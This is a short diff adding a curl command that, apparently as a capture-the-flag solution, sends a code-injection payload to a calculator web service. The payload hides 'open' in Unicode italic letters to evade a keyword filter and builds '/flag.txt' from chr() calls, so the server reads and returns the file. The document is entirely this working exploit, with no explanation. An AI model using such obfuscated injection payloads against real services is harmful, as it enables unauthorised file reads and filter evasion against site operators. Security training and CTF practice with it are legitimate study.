@@ -1,0 +1,3 @@
+curl -X POST "https://calc.1nf1n1ty.team/calculate" \
+     -H "Content-Type: application/json" \
+     -d '{"expression": "𝘰𝘱𝘦𝘯(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()"}' | cut -d ":" -f2 | cut -d '"' -f2
